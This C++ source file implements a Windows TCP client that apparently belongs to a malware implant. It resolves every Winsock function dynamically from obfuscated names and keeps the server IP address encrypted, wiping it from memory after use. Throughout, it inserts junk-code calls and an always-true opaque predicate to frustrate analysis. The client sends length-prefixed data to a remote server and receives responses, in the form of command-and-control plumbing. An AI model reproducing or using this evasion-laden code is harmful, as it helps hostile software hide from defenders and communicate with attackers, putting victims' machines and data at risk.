#include "TCPClient.h"
#include "junk_codes.h"
#include "byte_encryption.h"
#include "winapi_obfuscation.h"

TCPClient::TCPClient(EncryptedBytes* ipAddr, int port)
{
	this->sock = 0;
	this->ipAddr = ipAddr;
	this->port = port;
}

TCPClient::~TCPClient()
{
	this->close();
}

int TCPClient::start_connection()
{
	// Init Winsock
	WSAData data;
	WORD ver = MAKEWORD(2, 2);
	int wsResult = resolve_dynamically<WSAStartup_t>(str_WSAStartup, str_ws2_32)(ver, &data);
	if (wsResult != 0)
	{
#ifdef _DEBUG
		std::cerr << "Error initializing Winsock, Err #" << wsResult << std::endl;
#endif
		return -1;
	}

	small_junk();

	// Create Socket
	this->sock = resolve_dynamically<socket_t>(str_socket, str_ws2_32)(AF_INET, SOCK_STREAM, 0);

	if (sock == INVALID_SOCKET)
	{
#ifdef _DEBUG
		std::cerr << "Error creating socket, Err #" << resolve_dynamically<WSAGetLastError_t>(str_WSAGetLastError, str_ws2_32)() << std::endl;
#endif 
		return -1;
	}

	suspicious_junk_2();

	sockaddr_in serverAddr;
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = resolve_dynamically<htons_t>(str_htons, str_ws2_32)(port); // convert to big endian (the network byte order)

	std::string ipDecrypted = decrypt_string(*ipAddr);
	resolve_dynamically<inet_pton_t>(str_inet_pton, str_ws2_32)(AF_INET, ipDecrypted.c_str(), &serverAddr.sin_addr);
	wipeStr(ipDecrypted);

	int connectionResult = resolve_dynamically<connect_t>(str_connect, str_ws2_32)(sock, (sockaddr*)&serverAddr, sizeof(serverAddr));

	if (connectionResult == SOCKET_ERROR)
	{
#ifdef _DEBUG
			std::cerr << "Error connecting to server, Err #" << resolve_dynamically<WSAGetLastError_t>(str_WSAGetLastError, str_ws2_32)() << std::endl;
#endif 
		return -1;
	}

	return 0;
}

void TCPClient::send_data(std::string data)
{
	int dummy = 0x41;

	// Send length header first
	uint32_t len = (uint32_t)data.length();
	uint32_t dataLenInNetworkOrder = resolve_dynamically<htonl_t>(str_htonl, str_ws2_32)(len);

	int sendResult = resolve_dynamically<send_t>(str_send, str_ws2_32)(this->sock, reinterpret_cast<const char*>(&dataLenInNetworkOrder), sizeof(dataLenInNetworkOrder), 0);

	if (sendResult == SOCKET_ERROR)
	{
#ifdef _DEBUG
		std::cerr << "Error sending length header, Err #" << resolve_dynamically<WSAGetLastError_t>(str_WSAGetLastError, str_ws2_32)() << std::endl;
#endif
		return;
	}

	int garbage = not_inlined_junk_func_3((int)data.capacity(), len, &sendResult) ^ 0x41;
	if ((dummy ^ garbage) == not_inlined_junk_func_3((int)data.capacity(), len, &sendResult)) // Always true
	{
		// Now send the data itself
		sendResult = resolve_dynamically<send_t>(str_send, str_ws2_32)(this->sock, data.c_str(), len, 0);

		if (sendResult == SOCKET_ERROR)
		{
#ifdef _DEBUG
			std::cerr << "Error sending data to server, Err #" << resolve_dynamically<WSAGetLastError_t>(str_WSAGetLastError, str_ws2_32)() << std::endl;
#endif 
			return;
		}

	}
}

//char* TCPClient::recv_data(int bytes) {
//	char* buf = new char[bytes];
//
//	int bytesReceived = recv(this->sock, buf, bytes, 0);
//	if (bytesReceived > 0)
//	{
//		std::cout << "SERVER> " << std::string(buf, bytesReceived) << std::endl;
//	}
//	return buf;
//}

std::string TCPClient::recv_data() {
	// Receiving the buffer length header
	uint32_t bufLength = 0;
	resolve_dynamically<recv_t>(str_recv, str_ws2_32)(this->sock, reinterpret_cast<char*>(&bufLength), 4, 0);
	bufLength = resolve_dynamically<ntohl_t>(str_ntohl, str_ws2_32)(bufLength); // Convert to host byte order

	if (bufLength != 0)
	{
		std::string buf(bufLength, '\0');

		// Receiving the actual buffer sent
		int bytesReceived = resolve_dynamically<recv_t>(str_recv, str_ws2_32)(this->sock, &buf[0], bufLength, 0);
#ifdef _DEBUG
		if (bytesReceived == SOCKET_ERROR || bytesReceived != bufLength)
		{
			std::cerr << "Error in recv(), Err #" << resolve_dynamically<WSAGetLastError_t>(str_WSAGetLastError, str_ws2_32)() << std::endl;
		}
#endif
		return buf;
	}
	return std::string("");
}

void TCPClient::close() {
	resolve_dynamically<closesocket_t>(str_closesocket, str_ws2_32)(this->sock);
	resolve_dynamically<WSACleanup_t>(str_WSACleanup, str_ws2_32)();
}
